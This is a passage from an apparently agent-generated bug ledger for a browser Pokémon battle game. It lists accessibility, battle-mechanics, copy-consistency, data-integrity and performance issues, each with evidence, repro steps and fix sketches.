**Title**: Pokémon Center storage rows are mouse-only clickable divs (no keyboard access)

**Evidence**:
```html
<div data-pc-row="team" data-pc-id="..." style="...cursor:pointer;" title="Click to view full build">
  ...<span ...>... <span ...>ⓘ</span></span>
  <button ...>Deposit</button>
</div>
```
The row `<div>` (lines 47557, 47595, and Underground 47688) carries a click handler delegated via `closest('[data-pc-id]')` at 47616 to open the full build summary, but has no `tabindex`, no `role="button"`, and there is NO keydown handler. The "view build" affordance is signalled only by a tiny `ⓘ` glyph. Keyboard/SR users can reach the Deposit/Withdraw/Release buttons but can never open a Pokémon's full build. Contrast the field-pill at line 17626 which does it correctly (`role="button" tabindex="0"` + Enter/Space keydown).

**Repro**: Pokémon Center → PC Storage tab. Tab through; the row itself is never focusable, only the inner buttons.

**Blast radius**: PC Storage tab + The Underground tab (`screen-story-pokemoncenter`).

**Fix sketch**: Add `role="button" tabindex="0"` to the row div and an `onkeydown` (Enter/Space) that fires the same `data-pc-id` handler, or move the click affordance onto a dedicated info `<button>` next to the action buttons.

**Verification**: Tab to a PC row, press Enter — build summary opens.

---

## <a id="ISSUE-188"></a> ISSUE-188: 2-5 multi-hit distribution is 33/33/17/17, not the modern 35/35/15/15

---
id: ISSUE-188
severity: P2
category: bug
anchor_symbol: performAction
current_line_hint: ~23118
file: battle.html
agents: [battle-engine-debugger]
fingerprint: 0fd8a87af215
confidence: high
status: fixed-claude/funny-clarke-EnGMv
---

**Title**: 2-5 multi-hit distribution is 33/33/17/17, not the modern 35/35/15/15

**Evidence**:
```js
const _roll25 = (mn, mx) => (mn === mx ? mn : [2, 2, 3, 3, 4, 5][Math.floor(Math.random() * 6)]);
```

**Repro**: `node scripts/debug/_repro/multihit-rolls.mjs` (Part A) — the array `[2,2,3,3,4,5]` over a uniform 1-of-6 pick yields 2:33.3% / 3:33.3% / 4:16.7% / 5:16.7%. Modern (Gen 5+) canon is 2:35% / 3:35% / 4:15% / 5:15%. Not listed in `tests/reports/deviations.md`.

**Blast radius**: Every 2-5 hit move without Skill Link / Loaded Dice (Bullet Seed, Rock Blast, Icicle Spear, Pin Missile, Tail Slap, Bone Rush, Scale Shot, etc.) lands 4-5 hits slightly too often and 2-3 hits slightly too rarely — a small but systematic damage-distribution skew vs Showdown.

**Fix sketch**: Replace the 6-slot array with the canonical weighted roll, e.g. pick a uniform `r` in [0,1) and map `<0.35→2, <0.70→3, <0.85→4, else→5` (35/35/15/15). Keep the Skill Link / Loaded Dice overrides unchanged.

**Verification**: Sample the new roll 200k times in the repro; bucket percentages must land within ~0.5% of 35/35/15/15.

---

## <a id="ISSUE-189"></a> ISSUE-189: Multi-hit moves reuse one damage roll & one crit check for every hit (no per-hit independence)

---
id: ISSUE-189
severity: P2
category: bug
anchor_symbol: performAction
current_line_hint: ~23776
file: battle.html
agents: [battle-engine-debugger]
fingerprint: f229af11d3b5
confidence: high
status: open
---

**Title**: Multi-hit moves reuse one damage roll & one crit check for every hit (no per-hit independence)

**Evidence**:
```js
let rng = 0.85 + (Math.random() * 0.15);            // ~23349 — rolled ONCE
let crit = (... Math.random() < critRate) ? 1.5 : 1; // ~22844 — rolled ONCE
// in the per-hit loop every strike reuses the same `damage`:
let _hitDmg = (parentalBondActive && h === 1) ? Math.floor(damage * 0.25) : damage;
```

**Repro**: `node scripts/debug/_repro/multihit-rolls.mjs` (Part B) — Cloyster Icicle Spear (Skill Link → 5 hits) vs a 999HP wall deals 395 total = exactly 79.00 per hit; with live RNG every hit would still be identical because `rng` and `crit` are computed once above the loop.

**Blast radius**: In Showdown each hit of a multi-hit move rolls its own 0.85-1.0 spread and its own crit. Here all hits share one roll, so per-hit variance is zero and a multi-hit move can never crit on only some hits. Tightens the damage distribution and removes partial-crit outcomes; also means Focus Sash / Sturdy break correctly but Anger Point / per-hit crit interactions diverge.

**Fix sketch**: Move the `rng` spread and the `crit` roll inside the per-hit loop (recompute `damage` per strike), preserving Parental Bond's 0.25× second hit and Triple Axel/Kick BP escalation. Cache the static parts (basePower, A/D, modifier sans rng/crit) outside the loop for perf.

**Verification**: Repro should show per-hit damages varying across hits when RNG is unpinned; add a property test asserting a multi-hit move's total is NOT exactly `numHits * (single-hit damage)` over many trials.

---

## <a id="ISSUE-190"></a> ISSUE-190: OHKO moves use the generic accuracy gate — affected by evasion/accuracy stages, Compound Eyes, Gravity; no higher-level auto-fail

---
id: ISSUE-190
severity: P2
category: bug
anchor_symbol: performAction
current_line_hint: ~22752
file: battle.html
agents: [battle-engine-debugger]
fingerprint: d2c978ecb9e7
confidence: medium
status: open
---

**Title**: OHKO moves use the generic accuracy gate — affected by evasion/accuracy stages, Compound Eyes, Gravity; no higher-level auto-fail

**Evidence**:
```js
// general acc gate (~22377) applies stages/Compound Eyes/Gravity to move.acc:
let finalAcc = neverMiss ? 999 : (move.acc * accMod * evaMod * getAccEvaMult(accStage) * micleMod);
// OHKO block (~22752) handles Sturdy/Sash/immunity but has NO level-diff accuracy and NO "target higher level → fail":
const _ohkoMoves = new Set(["Fissure","Horn Drill","Guillotine","Sheer Cold"]);
```

**Repro**: Scenario — Fissure (DB acc 30) vs a target with +2 evasion: engine multiplies 30 by the evasion modifier (canon: OHKO accuracy ignores evasion/accuracy stages entirely). A Compound Eyes user gets 30×1.3=39 (canon: 30). No path sets accuracy = `(userLevel − targetLevel) + 30` nor fails when the target out-levels the user.

**Blast radius**: Lower-impact in the Lv50 VGC mirror (level diff = 0, base 30%), but OHKO moves wrongly scale with evasion/accuracy boosts, Compound Eyes, Gravity (×5/3) and Micle Berry, and never auto-fail against a higher-level target — all of which diverge from canon and matter once levels differ (wild battles, story foes).

**Fix sketch**: Special-case OHKO moves before the generic acc gate: compute `acc = 30 + (attacker.level − defender.level)`, auto-fail if `defender.level > attacker.level`, and skip the evasion/accuracy-stage / Compound Eyes / Gravity / Micle modifiers for them. Sheer-Cold-vs-Ice and Sturdy/Sash handling already exist.

**Verification**: Add a test: Fissure vs a +6-evasion target still lands at 30% (not reduced); Fissure vs a higher-level target always fails.

---

## <a id="ISSUE-191"></a> ISSUE-191: "Vitamin" names three distinct systems — IV items, casino prize, EV voucher

---
id: ISSUE-191
severity: P2
category: inconsistency
anchor_symbol: PERM_BOOST_ITEMS
current_line_hint: ~32685
file: battle.html
agents: [consistency-auditor]
fingerprint: 51dd9b25936e
confidence: high
status: open
---

**Title**: "Vitamin" names three distinct systems — IV items, casino prize, EV voucher

**Evidence**:
```js
// 32690: const PERM_BOOST_ITEMS = [...]  (protein/iron/... = IV-boost "vitamins")
// 32690 comment: "Distinct from the EV Trainer's Vitamin Pack voucher"
// 9196: casino subtitle "...guarantees a Rare Voucher + Vitamins!" (+1 IV)
// 59247: "Use 1 Vitamin Pack to apply EVs ... Vitamins left after use" (EV voucher)
```

**Repro**: grep -niE 'vitamin' battle.html — three referents in UI copy.

**Blast radius**: EV Trainer screen, casino prize copy, bag, IV item tooltips. Player reads "Vitamins" in casino, expects the EV "Vitamin Pack", gets IV items.

**Fix sketch**: Pure-text. Rename the IV-boost class to "IV Tonic/Supplement" in copy (keep `PERM_BOOST_ITEMS` id), or rename the EV voucher to "EV Pack". Casino prize copy should name whichever it actually drops. No mechanics change.

**Verification**: Each UI string referencing "vitamin" maps to exactly one system.

---

## <a id="ISSUE-192"></a> ISSUE-192: Nurse Joy first-Center tutorial says PC has "ten slots" but PC_BOX_CAP is 30

---
id: ISSUE-192
severity: P2
category: inconsistency
anchor_symbol: playStoryTutorial
current_line_hint: ~36972
file: battle.html
agents: [consistency-auditor]
fingerprint: 4b71628ae0f5
confidence: high
status: open
---

**Title**: Nurse Joy first-Center tutorial says PC has "ten slots" but PC_BOX_CAP is 30

**Evidence**:
```js
// firstPokemonCenter tutorial (line ~36972)
'"Upstairs is the PC: ten slots of cold storage for every partner you\'ve caught but can\'t field today. Deposit, withdraw, release — the usual courtesies."',
// but the actual cap (line ~43126):
const PC_BOX_CAP = 30;
// and the PC tab UI + main help both say 30:
//   line ~10651: "<b>PC Storage</b> (cap 30) ..."
//   line ~43331: <span>PC <strong>${box.length}/${PC_BOX_CAP}</strong></span>
```

**Repro**: Start a fresh story run, reach the first Pokémon Center; Nurse Joy's tutorial reads "ten slots." Open the PC tab on the same screen — header shows "/30," and the main help text says "(cap 30)."

**Blast radius**: Player-facing copy only (the tutorial is purely narrative; capacity logic uses `PC_BOX_CAP`). No gameplay effect, but the onboarding line actively misinforms about the storage limit — the same "10 vs 30" contradiction the prior ledger flagged for the help text, fixed everywhere except this tutorial string.

**Fix sketch**: Change "ten slots" to "thirty slots" (or a cap-agnostic phrasing like "a wall of cold storage") in the `firstPokemonCenter` tutorial line so it matches `PC_BOX_CAP` and the rest of the UI.

**Verification**: Grep `ten slots` returns no hits; load a fresh run and confirm the Nurse Joy line no longer says "ten." Optionally assert the tutorial string contains no hardcoded slot count.

---

## <a id="ISSUE-193"></a> ISSUE-193: End-of-turn residuals always resolve player-active-first, not in Speed order

---
id: ISSUE-193
severity: P2
category: bug
anchor_symbol: playTurn
current_line_hint: ~21045
file: battle.html
agents: [battle-engine-debugger]
fingerprint: c4989fd4604d
confidence: high
status: open
---

**Title**: End-of-turn residuals always resolve player-active-first, not in Speed order

**Evidence**:
```js
// Both EoT call sites (the residual phase and the post-faint replacement path) hard-code player first:
endOfTurnEffects(state.pActive, state.fActive); endOfTurnEffects(state.fActive, state.pActive);
```
Canon resolves end-of-turn residuals in Speed order (faster mon's residuals first; reversed under Trick Room; speed ties random). The engine always processes the player's active first.

**Repro**: Static read of both call sites (~20282 and ~21045). With a faster foe, its weather/poison/Leech-Seed residual should resolve before the player's, but does not.

**Blast radius**: Mostly the rare case where both actives are at residual-faint range, or Leech Seed + a dying seeded mon — the order decides who faints first and whether the seeder gets its heal. Also any seeded-replay comparison vs Showdown.

**Fix sketch**: At both call sites, order the two `endOfTurnEffects` calls by `getEffectiveSpeed` (respecting Trick Room and a random tie-break), instead of always player-first. Keep the single post-loop `checkFaints`.

**Verification**: Construct a both-dying-from-residual scenario with a faster foe; assert the faster mon's residual log precedes the slower's and faint order matches Showdown.

---

## <a id="ISSUE-194"></a> ISSUE-194: Turn-loop median **23–38 ms / p95 35–53 ms / max 46–58 ms** in jsdom — production with `settings.animations=true` adds bounded `sleep()` delays on top, but the jsdom number IS the production floor when animations are off

---
id: ISSUE-194
severity: P2
category: perf
anchor_symbol: playTurn
current_line_hint: ~20409
file: battle.html
agents: [performance-profiler]
fingerprint: 95c389cb86e5
confidence: high
status: open
---

**Title**: Turn-loop median **23–38 ms / p95 35–53 ms / max 46–58 ms** in jsdom — production with `settings.animations=true` adds bounded `sleep()` delays on top, but the jsdom number IS the production floor when animations are off

**Evidence**: 60-turn (single trial) and 30×5-trial measurements, jsdom harness, `settings.animations=false`, `sleep()` short-circuited to `Promise.resolve()` by load-engine.js (so we measure pure CPU, not animation timing):

Run A (`/tmp/deep-perf5.mjs`, 60 turns, 5 warmup): n=60 median **22.41**, p95 **35.08**, max **43.50**, mean **22.70**, range 1.9× median→max.

Run B (`/tmp/turnloop.mjs`, 30×5=150 samples, 10 warmup): n=150 median **37.63**, p95 **42.54**, max **46.46**, min **5.78**, IQR **17.07**.

Top 5 slowest turns from a 60-turn pass: turns 4 (43.5), 1 (39.9), 0 (35.1), 36 (34.2), 12 (33.8) — first-3 outliers are JIT warmup leftovers; the turn-12/36 outliers are post-warmup and point at non-deterministic branches (status moves with multiple `changeStage` + `logMsg` calls).

```js
// battle.html:20409 — playTurn enters here, then calls __runLockedPvPTurnResolution
// which calls performAction (battle.html:21286, 3358 lines long) which calls parseMoveEffects
// (battle.html:25853) per move, all under one async/await chain.
window.playTurn = async function(pMoveIndex, pSwitchIndex) {
    if(state.isLocked) return;
    if (state.isOver) return;
    ...
    await window.__runLockedPvPTurnResolution();
};
```

**Repro**: `/tmp/turnloop.mjs` + `/tmp/deep-perf5.mjs`, both this session, 2026-05-28. The harness uses jsdom which is **~2–3× slower than a modern Chromium DOM** for `appendChild`/`createElement`, so production browser numbers should be lower in absolute terms BUT animations move them back up.

**Blast radius**: ~30 ms / turn × 30 turns per battle × 100 battles per run ≈ 90 seconds of pure CPU per playthrough — invisible to the user when distributed across input pauses. The risk is the **distribution**: with median 22 ms but p95 42 ms, ~5% of turns will visibly stall (>1 dropped frame at 60 Hz). Production with `settings.animations=true` adds bounded `sleep()` delays — those are pacing, not CPU work — so the floor stays here. Bound to ISSUE-062 (existing P2 noting max 78-84ms outliers).

**Fix sketch**: Two compounding levers: (1) fix the logMsg tooltipDict scan (fingerprint 290cc0fb39e4 above) — drops every turn that has 5+ logMsg calls by 1.5+ ms; (2) cache the `_isPlayer ? state.pSide : state.fSide` and `state.terrain === "Electric" && state.terrainTurns > 0` predicates that recur dozens of times across parseMoveEffects branches (currently re-evaluated per branch).

**Verification**: Re-bench `/tmp/turnloop.mjs` after the logMsg fix; expect median to drop from 22 → ~15 ms and p95 from 42 → ~28 ms. Long-tail (max) should improve more than median because slow turns are the ones with the most logMsg/stat-change traffic.

---

## <a id="ISSUE-195"></a> ISSUE-195: 29 of 31 mart/dept catalog items (potion, superPotion, X items, orbs, etc.) have no entry in `data/items.json`

---
id: ISSUE-195
severity: P2
category: data
anchor_symbol: POKEMART_ITEMS
current_line_hint: ~28876
file: battle.html
agents: [data-integrity-auditor]
fingerprint: 8d497740c197
confidence: medium
status: open
---

**Title**: 29 of 31 mart/dept catalog items (potion, superPotion, X items, orbs, etc.) have no entry in `data/items.json`

**Evidence**:
```js
// battle.html POKEMART_ITEMS + DEPT_ITEMS (verified ids):
// pokeBall    -> items.json: present (pokeball)
// greatBall   -> items.json: present (greatball)
// potion, superPotion, hyperPotion, maxPotion, fullRestore, fullHeal,
// ether, elixir, maxElixir, xAttack, xDefense, xSpAtk, xSpDef, xSpeed,
// xAccuracy, direHit, guardSpec, revivalHerb, revive, maxRevive,
// sunOrb, rainOrb, hailOrb, sandOrb, electricOrb, grassyOrb,
// psychicOrb, mistyOrb, emergencyTeleporter -> ALL MISSING from items.json
```

**Repro**: `node -e` lookup against `data/items.json` flattened keys for each mart id reports MISSING for everything except `pokeBall` and `greatBall`. See `battle.html:28876-28910`.

**Blast radius**: The mart catalog is self-contained (each row has `id`, `name`, `desc`, `effect`), so the shop works fine without items.json. The only consumer that reaches into items.json is the tooltip dictionary in `loadGameData` (sets `tooltipDict[it.name] = it.shortDesc`); mart items use their own `desc` field, so this works too. However, any future feature that uniformly walks `items.json` to render bag UI, drop tables, or inventory analytics will see a phantom-item population — bag items and held items live in two disjoint universes.

**Fix sketch**: Either (a) add the 29 missing entries to `data/items.json` so the catalog is the single source of truth for item metadata; or (b) document explicitly in a `data/README.md` (or schema note) that `items.json` covers only held-items / berries and that bag/shop consumables live exclusively in `POKEMART_ITEMS` and `DEPT_ITEMS`. Option (b) is much cheaper and matches the historical architecture.

**Verification**: If option (a), the mart-coverage check (added to `scripts/debug/data-validator.mjs`) should pass. If option (b), the README addition is the deliverable; no code change.

---

## <a id="ISSUE-196"></a> ISSUE-196: Mart/Dept consumables (30 ids: potion, xAttack, sunOrb, evResetCharm…) are a self-contained namespace, NOT entries in items.json

---
id: ISSUE-196
severity: P2
category: data
anchor_symbol: POKEMART_ITEMS
current_line_hint: ~29934
file: battle.html
agents: [data-integrity-auditor]
fingerprint: 4177b7fb1027
confidence: high
status: open
---

**Title**: Mart/Dept consumables (30 ids: potion, xAttack, sunOrb, evResetCharm…) are a self-contained namespace, NOT entries in items.json

**Evidence**:
```js
const POKEMART_ITEMS = [
  { id:'pokeBall', ..., kind:'ball', ballKey:'poke' },
  { id:'potion', ..., effect:'heal20' },   // <- effect handler inline, not in items.json
  ...
];
// Cross-ref: 30/32 mart+dept ids resolve via inline 'effect'/'kind'; only
// pokeBall + greatBall map to items.json. STONE_SHOP_ITEMS: 24/24 resolve.
```

**Repro**: Cross-reference `[...POKEMART_ITEMS, ...DEPT_ITEMS]` ids against `data/items.json` (normalized) — 30 ids (all consumables/orbs/X-items) are absent; they carry inline `effect`/`kind` handlers instead.

**Blast radius**: Documentation/clarity only — these are intentionally engine-defined consumables with inline handlers, so a literal "mart id must exist in items.json" check yields 30 false positives. items.json is the competitive held-item/berry/ball dataset, not the shop-consumable catalog. Held-item/berry/ball handler coverage (check #8) is satisfied: balls route through `ballKey`, and the only items.json-backed mart entries are the two balls.

**Fix sketch**: No code change needed. Note in the data-validator / REDESIGN docs that POKEMART_ITEMS/DEPT_ITEMS consumables are a distinct namespace from items.json so future audits don't flag them; if a unified registry is desired later, add a `source` tag.

**Verification**: N/A (informational). Confirm STONE_SHOP_ITEMS (24/24) and the two balls remain the only items.json-backed shop ids.

---

## <a id="ISSUE-197"></a> ISSUE-197: `_storyBattleEntryBusy` can latch true on a cold-open / beat-scene continuation throw → soft-locks "Enter Gym / Continue Route"

---
id: ISSUE-197
severity: P2
category: bug
anchor_symbol: proceedToNextBattle
current_line_hint: 46744 (set), 43173 + 47559 (only releases)
file: battle.html
agents: [story-mode-investigator]
fingerprint: c69ad43dcc8c
confidence: medium
status: open
---

**Title**: `_storyBattleEntryBusy` can latch true on a cold-open / beat-scene continuation throw → soft-locks "Enter Gym / Continue Route"

**Evidence**:
```js
// proceedToNextBattle sets the guard (46744): _storyBattleEntryBusy = true;
// It is released in EXACTLY two places:
//   enterCity   (43173):   _storyBattleEntryBusy = false;
//   launchBattle(47559):   _storyBattleEntryBusy = false;
// The cold-open continuation swallows a throw WITHOUT releasing:
scene.run(ev, () => { if (tip) _storyRunSceneMark(tip);
    try { onPlayed && onPlayed(); }                       // onPlayed = enterBattleEvent(ev,..,true)
    catch (e) { console.error('[Story] cold-open onPlayed threw:', e); } });   // <-- flag stays true
// Same pattern in the beat-scene continuation (47357-47360).
```

**Repro**: Drive `proceedToNextBattle` into a Battle row whose cold-open/beat-scene continuation throws synchronously before reaching `launchBattle` (e.g. a corrupt trainer roll). The flag stays `true`; every later `proceedToNextBattle` hits `if (_storyBattleEntryBusy) { _storyWarnInteractionBusy(); return; }` and shows "Finish your current action first." — wedged until reload. (`showBattleIntro`/`showVictoryOverlay` callbacks already self-recover to a city, but the cold-open/beat-scene continuations do not.)

**Blast radius**: Any gym entry / route advance after the throw. Low probability (requires an exception on the cold-open/beat continuation path), but the failure mode is a hard progression wedge with no in-game recovery.

**Fix sketch**: Wrap the `proceedToNextBattle` body so the flag is released in a `finally`, OR add `_storyBattleEntryBusy = false;` to the catch blocks of `_runStoryColdOpen`'s `onPlayed` wrapper and `_playStoryBeatScene`'s continuation. Cheapest: have those two catch blocks route to `enterCity()` (which releases) on throw, mirroring the victory/intro overlays.

---

## <a id="ISSUE-198"></a> ISSUE-198: City-0 starter pick is drawn from a pure-G4 (weakest tier) pool

---
id: ISSUE-198
severity: P2
category: balance
anchor_symbol: PROF_ROLLS
current_line_hint: ~32137
file: battle.html
agents: [story-mode-investigator]
fingerprint: 1ac1fa493205
confidence: high
status: open
---

**Title**: City-0 starter pick is drawn from a pure-G4 (weakest tier) pool

**Evidence**:
```js
const PROF_ROLLS = [
  {g1:0, g2:0, g3:0, g4:100}, // C0 — pure G4 basic
  ...
];
// First professor pick at City0 -> isStarterPick:true (starter:true badge),
// all 3 choices are guaranteed grade-4 (weakest band).
```

**Repro**: New game -> City0 Professor -> all three starter cards are G4. The player's flagged "★ STARTER" is always a weakest-grade species, carried through the first several battles.

**Blast radius**: First-impression balance + early-game difficulty feel. NOTE: difficulty-curve numbers are maxwell-owned (CLAUDE.md) — flag only, do not edit. Prior audit §2.4 recommended flooring City0 at G3; still unaddressed.

**Fix sketch**: (maxwell) Floor the City0 starter pool at G3, e.g. {g3:30,g4:70}, or weight a regional-starter homage trio higher.

**Verification**: Confirm PROF_ROLLS[0] includes a non-zero g3 share and the starter cards reflect it.

---

## <a id="ISSUE-199"></a> ISSUE-199: Mystery swap picker mislabels BST grade as "Power tier (1-4)"

---
id: ISSUE-199
severity: P2
category: inconsistency
anchor_symbol: profAccept
current_line_hint: ~45292
file: battle.html
agents: [story-mode-investigator]
fingerprint: aea4e9950e8b
confidence: high
status: open
---

**Title**: Mystery swap picker mislabels BST grade as "Power tier (1-4)"

**Evidence**:
```js
const g = t.name ? getMonGrade(t.name, getBST(t.name)) : 4;   // BST GRADE
slot.innerHTML = ... <span class="tier-badge bg-tier-" title="Power tier (1–4)">T</span> ...
```

**Repro**: Reach an at-cap Professor (swap mode) or the City-8 legendary gate; the team slots show "T1..T4" badges whose tooltip reads "Power tier (1-4)". The value is getMonGrade (BST band), NOT the build powerTier (UNTRAINED/NOVICE/COMPETENT/TOURNAMENT). The normal pick card deliberately *removed* the training-tier chip "per the opening-flow spec" because it confused players, yet this surface reintroduces the confusion with a wrong label.

**Blast radius**: Player-facing mislabel; conflates two distinct internal concepts (species grade vs build power tier).

**Fix sketch**: Relabel the swap-slot badge tooltip to "Grade (1-4)" (or drop the chip to match the pick-card decision).

**Verification**: Open the swap picker; confirm the badge tooltip no longer says "Power tier".

---

## <a id="ISSUE-200"></a> ISSUE-200: README calls catch / PC / Underground / Safari / boss-arc "upcoming"; all are shipped

---
id: ISSUE-200
severity: P2
category: inconsistency
anchor_symbol: README
current_line_hint: n/a
file: README.md
agents: [spec-drift-auditor]
fingerprint: 61ee59240f4d
confidence: high
status: open
---

**Title**: README calls catch / PC / Underground / Safari / boss-arc "upcoming"; all are shipped

**Evidence**:
```text
README.md:44  "See `STORY_MODE_FLOW.md` for the working spec of the UPCOMING
              catch / PC / Underground / Safari / boss-arc systems."
```
```js
// All shipped in battle.html (samples):
//   #screen-story-catch (7 refs), enterSafari (4), SAFARI_MAX_ENCOUNTERS,
//   _bossArc* (15 refs), "Subject Zero" (23 refs), PC_BOX_CAP = 30,
//   _WILD_GRADE_CURVE_BY_BADGES, Crucible (67 refs), enterPits, enterDaycare.
//   SAVE_VER = 21 (the catch/PC schema landed at v15).
```

**Repro**: `grep -cE 'screen-story-catch|enterSafari|Subject Zero|PC_BOX_CAP' battle.html` → all non-zero.

**Blast radius**: README is the entry doc; "upcoming" implies these systems are unbuilt when they are fully in the live build. Misleads new contributors and undercuts the (now de-scoped) distinction. Task check #6 ("every feature mentioned in README must be reachable from UI"): the *only* forward-looking claim is this "upcoming" sentence — and the features it names ARE reachable; the word "upcoming" is the defect.

**Fix sketch**: Reword README line 44 to "See `STORY_MODE_FLOW.md` for the spec of the catch / PC / Underground / Safari / boss-arc systems (shipped)."

**Verification**: README no longer labels shipped systems as upcoming.

---

## <a id="ISSUE-201"></a> ISSUE-201: Catch screen result/throw text has no aria-live; outcomes silent to screen readers

---
id: ISSUE-201
severity: P2
category: a11y
anchor_symbol: renderCatchScreen
current_line_hint: ~9079
file: battle.html
agents: [accessibility-ux-auditor]
fingerprint: a90d80077070
confidence: high
status: open
---

**Title**: Catch screen result/throw text has no aria-live; outcomes silent to screen readers

**Evidence**:
```html
<!-- screen-story-catch: body is rebuilt every throw, no live region -->
<div id="story-catch-body" style="flex:1;overflow-y:auto;...background:rgba(6,16,10,0.35);..."></div>
```
`renderCatchScreen()` injects `_catchState.message` (e.g. "It broke free!", "Gotcha!", boss-HP changes) into `#story-catch-body` as a plain `<div>` via `innerHTML`. The casino result strips all carry `aria-live="polite"` (lines 9184/9224/9265) but the catch flow — the single most outcome-driven Story screen — has none. A blind player throws a ball and gets no announcement of catch/break-free/flee.

**Repro**: VoiceOver/NVDA on, enter a Wild Encounter, throw a ball. Result text appears but is not announced.

**Blast radius**: Catch screen, Safari mode, Caged God boss (`bossMode` HP attrition messages also live here).

**Fix sketch**: Add `aria-live="polite" aria-atomic="false"` to `#story-catch-body` (HTML line 9079), or wrap the `${message}` block in a dedicated `role="status"` element. Mirror the casino pattern.

**Verification**: With a screen reader, each throw outcome is spoken once.

---

## <a id="ISSUE-202"></a> ISSUE-202: City-hub Mystery Figure NPC sprite is hard-coded to Cyrus, ignoring `sm.mysteryIdentity` rotation

---
id: ISSUE-202
severity: P2
category: bug
anchor_symbol: renderCityActions
current_line_hint: ~35956
file: battle.html
agents: [story-mode-investigator]
fingerprint: 387fecfc77f7
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: City-hub Mystery Figure NPC sprite is hard-coded to Cyrus, ignoring `sm.mysteryIdentity` rotation

**Evidence**:
```js
// battle.html ~35947 (renderCityActions, "swap mode" branch)
let spriteTrainerArg = { spriteFile: CITY_GUIDE_SPRITES[...] };
if (hasProf && !profUsedHere) {
    if (hasTeamRoom) {
        const hub = cityProfessorHubSlot(cityIdx);
        speakerLabel = hub.label;
        spriteTrainerArg = { spriteFile: hub.spriteFile };
    } else {
        speakerLabel = '???';
        spriteTrainerArg = 'Cyrus';     // ← hard-coded
    }
}
```
The Professor screen (battle.html ~36929) correctly uses `_storyEnsureMysteryIdentity()` for the sprite. The hub branch does not. So at City 8 + 8 badges, the hub NPC says ??? next to a Cyrus sprite even when `sm.mysteryIdentity === 'red'` and the upcoming Mystery Figure battle will show Red.

**Repro**: `?debugMystery=1` → seed legendary-gate state → enter City 8 hub. The hub sprite is Cyrus regardless of which identity was rolled at run start.

**Blast radius**: Cosmetic only — battle still works. Specifically affects 8 of 9 possible rolled identities (`ghetsis`/`cynthia`/`steven`/`n`/`red`/`lance`/`buried_alive`/`cartridge_self`) — the hub sprite is wrong for every variant except `cyrus`. Mild lore-coherence issue, since the Mystery Figure rotation was the explicit fix for the prior audit's "Mystery Figure sprite unconditionally Cyrus" finding (now fixed in the battle path, missed in the hub).

**Fix sketch**: Replace `spriteTrainerArg = 'Cyrus'` with `spriteTrainerArg = (_storyEnsureMysteryIdentity() || { sprite: 'Cyrus' }).sprite ?? 'Cyrus'` (mirror the Professor screen's hub picker exactly).

**Verification**: Force `sm.mysteryIdentity = 'red'` via DevTools, then re-render the City 8 swap hub. Sprite should be Red.

---

## <a id="ISSUE-203"></a> ISSUE-203: Pokémon Center copy promises a "Heal" that no longer exists (full-heal is automatic)

---
id: ISSUE-203
severity: P2
category: bug
anchor_symbol: renderCityActions
current_line_hint: ~38999
file: battle.html
agents: [story-mode-investigator]
fingerprint: 4fc1e6825b2d
confidence: high
status: open
---

**Title**: Pokémon Center copy promises a "Heal" that no longer exists (full-heal is automatic)

**Evidence**:
```js
// renderCityActions — button comment + label
// Pokémon Center — full party heal, free, unlimited
_push('recover', makeActionBtn('🏥 Pokémon Center','center','window.StoryMode.enterPokemonCenter()','center', _facOpts('center', [{label:'Free',tone:'free'}])));
// city tip (line ~38717), shown when a rival is at the route gate:
const _healTipLabel = _willFireWildNext ? 'Heal — your rival waits at the end of the road' : 'Heal — your rival is at the route gate';
```

**Repro**: STORY_MODE_FLOW §7 states the Center has "No heal function — full-heal between battles is universal." The Center screen (battle.html:8486–8508) has exactly three tabs — PC Storage / Underground / Rivalry — and no heal action. Yet the button comment says "full party heal", the meta badge is "Free", and the rival-gate tip literally reads "Heal — …" and routes to `enterPokemonCenter()`. A player who clicks "Heal" lands on the PC screen with nothing to heal.

**Blast radius**: First-time-player confusion; contradicts the canonical spec's headline mechanic (attrition removed). Pure copy/comment drift — no functional bug, but actively misleading.

**Fix sketch**: Reword the rival-gate tip to "Manage party / PC — your rival waits…" (or drop the tip), and update the button comment. If a heal affordance is desired for UX comfort, it would be a no-op (already full HP) so better to remove the word "Heal".

**Verification**: Walk to a pre-rival hub; confirm the tip no longer says "Heal"; confirm the Center screen shows no heal control.

---

## <a id="ISSUE-204"></a> ISSUE-204: ISSUE-038 is marked fixed but `No Item` is still absent from items.json and 11 build slots still reference it

---
id: ISSUE-204
severity: P2
category: inconsistency
anchor_symbol: resolveCsvBuildEntry
current_line_hint: ~10440
file: data/items.json
agents: [data-integrity-auditor]
fingerprint: 76a92ca8e149
confidence: high
status: fixed-claude/funny-clarke-EnGMv
---

**Title**: ISSUE-038 is marked fixed but `No Item` is still absent from items.json and 11 build slots still reference it

**Evidence**:
```js
// scripts/debug/data-validator.mjs ~119 — the validator only passes because it skips the sentinel:
if (field === 'item' && alt === 'No Item') continue;
// data/items.json still has NO entry named "No Item" (verified); 11 build slots still use it:
// gen8 (6): Vileplume/nu, Ninjask/pu, Giratina/godlygift, Gourgeist-Super/pu, Palossand/nu, ...
// gen9 (5): ...
```
The ledger records `ISSUE-038` with `status: fixed-claude/sharp-keller-eZEDN`, but the underlying data was never changed: items.json has no `No Item` entry and the 11 `data/builds/gen{8,9}.json` slots still carry `"No Item"` in their item arrays.

**Repro**: `node` scan of `data/builds/*.json` finds 11 slots whose `item` array includes `"No Item"` (gen8:6, gen9:5); a scan of `data/items.json` for `name === "No Item"` returns nothing. `node scripts/debug/data-validator.mjs` reports 0 findings only because line ~119 special-cases the sentinel.

**Blast radius**: Same as ISSUE-038 (combat works via the `'No Item'`→empty-slot sentinel fallthrough; only tooltip/`itemsJSON[norm('No Item')]` lookups get `undefined`). The new fact is the **status drift**: the issue is closed in the ledger while the data fix is absent, so anyone trusting the ledger believes this is resolved. Either the fix branch was never merged or it took option (b) (encode as absence) without migrating the 11 slots.

**Fix sketch**: Re-open ISSUE-038 (or land its intended fix) — add a placeholder `No Item` entry to `data/items.json`, OR migrate the 11 build slots to `null`/omit the alternative. Then drop the special-case skip at data-validator.mjs ~119 so the validator actually guards the invariant going forward.

**Verification**: After the fix, `data/items.json` has a `No Item` entry (or the 11 slots no longer contain `"No Item"`), and removing the validator's line ~119 skip still yields 0 missing-item findings.

---

## <a id="ISSUE-205"></a> ISSUE-205: `_trainerPoolCache` is an unbounded Map (keyed on type+gens) with no eviction — Fight Club draft / story-pool variety will grow it without limit

---
id: ISSUE-205
severity: P2
category: perf
anchor_symbol: rollTrainerTeam
current_line_hint: 33916
file: battle.html
agents: [performance-profiler]
fingerprint: 67d442f2bbd6
confidence: high
status: open
